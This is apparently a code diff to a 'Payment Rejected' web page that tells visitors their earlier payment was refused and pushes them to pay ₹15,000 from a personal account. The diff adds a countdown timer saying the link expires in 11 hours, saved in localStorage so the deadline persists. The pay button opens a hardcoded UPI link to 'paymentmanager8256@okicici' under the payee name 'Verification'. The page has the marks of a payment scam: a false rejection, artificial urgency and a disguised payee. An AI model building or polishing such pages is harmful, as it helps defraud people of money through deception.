@@ -44,6 +44,13 @@
       margin-top: 10px;
     }
 
+    .timer {
+      margin-top: 16px;
+      font-size: 16px;
+      font-weight: bold;
+      color: #333;
+    }
+
     .pay-btn {
       margin-top: 22px;
       padding: 14px;
@@ -81,15 +88,46 @@
 <body>
   <div class="card">
     <h2>Payment Rejected</h2>
-    <p>Your previous payment was made through an official account and has been rejected for security reasons.</p>
-    <p>To continue, you must complete the payment of <strong>₹15,000</strong> using  user account.</p>
-    <p class="note">Click below to proceed with secure payment.</p>
+    <p>Your previous payment was made through an official account and has been rejected.</p>
+    <p>Please complete the payment of <strong>₹15,000</strong> using a personal account.</p>
+    <div class="timer" id="countdown">Link expires in: --:--:--</div>
     <button class="pay-btn" onclick="redirectToUPI()">Pay Now ₹15,000</button>
+    <p class="note">Secure UPI payment required</p>
   </div>
 
   <script>
+    const countdownElement = document.getElementById("countdown");
+    const EXPIRY_KEY = "rejection_page_expiry";
+
+    function getOrSetExpiry() {
+      let expiry = localStorage.getItem(EXPIRY_KEY);
+      if (!expiry) {
+        expiry = Date.now() + 11 * 60 * 60 * 1000; // 11 hours
+        localStorage.setItem(EXPIRY_KEY, expiry);
+      }
+      return parseInt(expiry);
+    }
+
+    const expireTime = getOrSetExpiry();
+
+    const timer = setInterval(() => {
+      const now = Date.now();
+      const remaining = expireTime - now;
+
+      if (remaining <= 0) {
+        clearInterval(timer);
+        countdownElement.innerText = "Link expired";
+        return;
+      }
+
+      const hours = Math.floor((remaining / (1000 * 60 * 60)) % 24);
+      const minutes = Math.floor((remaining / (1000 * 60)) % 60);
+      const seconds = Math.floor((remaining / 1000) % 60);
+
+      countdownElement.innerText = `Link expires in: ${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+    }, 1000);
+
     function redirectToUPI() {
-      // Replace UPI ID below as needed
       const upiLink = "upi://pay?pa=paymentmanager8256@okicici&pn=Verification&am=15000&cu=INR";
       window.location.href = upiLink;
     }
